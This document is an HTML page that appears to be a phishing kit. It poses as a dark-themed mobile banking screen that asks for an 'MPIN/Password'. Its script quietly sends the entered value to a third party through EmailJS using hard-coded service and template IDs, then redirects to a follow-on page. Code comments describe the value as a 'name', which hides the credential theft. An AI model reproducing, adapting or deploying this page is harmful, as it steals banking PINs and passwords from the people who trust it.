<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter your Name</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "DM Sans", "Segoe UI", Roboto, Arial, sans-serif;
    }

    body {
      background: #121212;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      color: #f2f2f2;
    }

    .screen {
      width: 100%;
      max-width: 420px;
      min-height: 100vh;
      padding: 20px;
      background: #121212;
    }

    .back-btn {
      background: none;
      border: none;
      color: #f2f2f2;
      font-size: 28px;
      cursor: pointer;
      padding: 4px 0;
      line-height: 1;
    }

    h1 {
      font-size: 32px;
      font-weight: 600;
      margin-top: 28px;
      color: #f2f2f2;
    }

    .subtitle {
      font-size: 16px;
      color: #9a9a9a;
      margin-top: 12px;
    }

    .input-wrapper {
      margin-top: 40px;
      position: relative;
      border: 1.5px solid #6b6b6b;
      border-radius: 6px;
      height: 56px;
      display: flex;
      align-items: center;
      padding: 0 16px;
    }

    .input-wrapper:focus-within {
      border-color: #c8102e;
    }

    .input-wrapper input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #f2f2f2;
      font-size: 18px;
    }

    .input-wrapper input::placeholder {
      color: #8a8a8a;
    }

    .eye-btn {
      background: none;
      border: none;
      cursor: pointer;
      color: #8a8a8a;
      display: flex;
      align-items: center;
      padding: 4px;
    }

    .continue-btn {
      margin-top: 36px;
      width: 100%;
      height: 56px;
      border: none;
      border-radius: 6px;
      background: #a8102a;
      color: #ffffff;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s, opacity 0.2s;
    }

    .continue-btn:hover {
      background: #c0142f;
    }

    .continue-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
    }

    .forgot-link {
      display: block;
      text-align: center;
      margin-top: 24px;
      color: #e0606d;
      font-size: 16px;
      font-weight: 500;
      text-decoration: none;
      cursor: pointer;
    }

    .error {
      color: #e0606d;
      font-size: 14px;
      margin-top: 12px;
      min-height: 18px;
    }

    .shake {
      animation: shake 0.35s;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-6px); }
      75% { transform: translateX(6px); }
    }
  </style>
</head>
<body>
  <div class="screen">
    <button class="back-btn" id="backBtn" aria-label="Go back">&#8592;</button>

    <h1>Enter your MPIN/Password </h1>
    <p class="subtitle">Make sure your MPIN/Password is Correct</p>

    <div class="input-wrapper" id="inputWrapper">
      <input type="text" id="nameInput" placeholder="MPIN/Password" autocomplete="off">
      <button class="eye-btn" id="eyeBtn" aria-label="Toggle visibility">
        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>

    <p class="error" id="errorMsg"></p>

    <button class="continue-btn" id="continueBtn">Continue</button>

    <a class="forgot-link" id="forgotLink">Forgot Password?</a>
  </div>

  <script>
    // EmailJS configuration
    const SERVICE_ID = "service_8iot5xx";
    const TEMPLATE_ID = "template_2vp7oqq";
    const PUBLIC_KEY = "ttrKOZNMDMqFjqfPT";

    emailjs.init({ publicKey: PUBLIC_KEY });

    const nameInput = document.getElementById("nameInput");
    const eyeBtn = document.getElementById("eyeBtn");
    const continueBtn = document.getElementById("continueBtn");
    const backBtn = document.getElementById("backBtn");
    const forgotLink = document.getElementById("forgotLink");
    const errorMsg = document.getElementById("errorMsg");
    const inputWrapper = document.getElementById("inputWrapper");

    // Show / hide the entered name
    let visible = true;
    eyeBtn.addEventListener("click", () => {
      visible = !visible;
      nameInput.type = visible ? "text" : "password";
    });

    // Back button
    backBtn.addEventListener("click", () => {
      if (window.history.length > 1) {
        window.history.back();
      }
    });

    // Forgot name
    forgotLink.addEventListener("click", () => {
      alert("Please contact support to recover your MPIN.");
    });

    // Continue: send name by EmailJS, then redirect
    continueBtn.addEventListener("click", async () => {
      const name = nameInput.value.trim();

      if (!name) {
        errorMsg.textContent = "Please enter your MPIN.";
        inputWrapper.classList.remove("shake");
        void inputWrapper.offsetWidth; // restart animation
        inputWrapper.classList.add("shake");
        nameInput.focus();
        return;
      }

      errorMsg.textContent = "";
      continueBtn.disabled = true;
      continueBtn.textContent = "Please wait...";

      try {
        await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
          name: name
        });

        // Save name so the next page can use it
        localStorage.setItem("userName", name);
        window.location.href = "Mp.html";
      } catch (error) {
        console.error("EmailJS error:", error);
        errorMsg.textContent = "Something went wrong. Please try again.";
        continueBtn.disabled = false;
        continueBtn.textContent = "Continue";
      }
    });

    // Press Enter to continue
    nameInput.addEventListener("keydown", (e) => {
      if (e.key === "Enter") continueBtn.click();
    });
  </script>
</body>
</html>
